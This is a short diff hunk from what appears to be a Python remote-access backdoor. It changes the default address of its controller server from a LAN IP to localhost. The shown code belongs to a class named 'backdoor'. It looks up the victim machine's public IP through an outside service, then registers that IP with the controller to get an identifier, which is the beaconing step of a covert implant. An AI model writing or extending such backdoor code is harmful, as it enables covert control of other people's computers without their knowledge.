@@ -30,7 +30,7 @@ def live(url, id):
 
 
 class backdoor:
-    def __init__(self, url="http://192.168.1.10:8000/"):
+    def __init__(self, url="http://127.0.0.1:8000/"):
         self.url = url
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
